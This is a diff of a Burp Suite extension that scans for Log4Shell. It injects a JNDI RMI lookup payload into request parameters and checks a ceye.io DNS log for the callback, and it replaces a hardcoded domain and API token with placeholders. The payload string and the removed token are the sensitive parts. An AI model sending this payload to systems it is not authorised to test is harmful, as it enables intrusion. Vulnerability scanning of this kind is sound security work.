@@ -51,8 +51,8 @@ class BurpExtender(IBurpExtender, IScannerCheck):
             parameterName, parameterValue, parameterType = parameter.getName(), parameter.getValue(), parameter.getType()
             randomStr = randmd5()
             
-            parameterValueRCE = '%24%7Bjndi%3Armi%3A%2F%2F'+ str(randomStr) + '.63lhuf.ceye.io%2F1%7D'
-            #parameterValueRCE = '${jndi:rmi://'+ str(randomStr) + '.63lhuf.ceye.io/1}'
+            parameterValueRCE = '%24%7Bjndi%3Armi%3A%2F%2F'+ str(randomStr) + '.你的ceye.io地址%2F1%7D'
+            #parameterValueRCE = '${jndi:rmi://'+ str(randomStr) + '.xxx.ceye.io/1}'
             newParameter = self._helpers.buildParameter(parameterName, parameterValueRCE, parameterType)
             newRequest = self._helpers.updateParameter(request, newParameter)
             #print newRequest
@@ -62,7 +62,7 @@ class BurpExtender(IBurpExtender, IScannerCheck):
             #resBodys = response[analyzedIResponseInfo.getBodyOffset():].tostring()
             #print resBodys
             #checkRequestResponse = self._callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), self._helpers.stringToBytes(NewReq))
-            r = requests.get("http://api.ceye.io/v1/records?token=b300f84379b6faaeef953352fb5cc384&type=dns&filter=" + str(randomStr))
+            r = requests.get("http://api.ceye.io/v1/records?token=你的ceye.io的token&type=dns&filter=" + str(randomStr))
             if randomStr in r.text and r.status_code == 200:
                 print "Found Vuln!!!"
                 return [CustomScanIssue(
